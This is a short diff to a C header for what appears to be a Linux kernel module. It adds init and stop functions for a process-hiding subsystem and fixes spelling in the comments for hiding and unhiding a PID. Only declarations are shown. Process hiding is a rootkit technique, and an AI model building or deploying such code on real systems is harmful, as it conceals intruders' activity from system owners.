@@ -4,6 +4,22 @@
 #include <linux/types.h>
 
 /**
+ * Initializes the subsystem that implements process hiding. This function is
+ * a singleton, it should be called just once.
+ *
+ * @return: Zero on success, non-zero elsewhere.
+ */
+int init_hidepid(void);
+
+/**
+ * Stops the hidepid subsystem, freeing all the resources taken. This function
+ * is a singleton, should be called just once.
+ *
+ * @return: Zero on success, non-zero elsewhere.
+ */
+int stop_hidepid(void);
+
+/**
  * Hides a pid in the system.
  *
  * @pid: The pid to hide.
@@ -12,9 +28,9 @@
 int hide_pid(pid_t pid);
 
 /**
- * Stops hidding a pid.
+ * Stops hiding a pid.
  *
- * @pid: The pid to stop hidding, if the pid wasn't already hidden returns an
+ * @pid: The pid to stop hiding, if the pid wasn't already hidden returns an
  * error.
  * @return: Zero on success, non-zero elsewhere.
  */
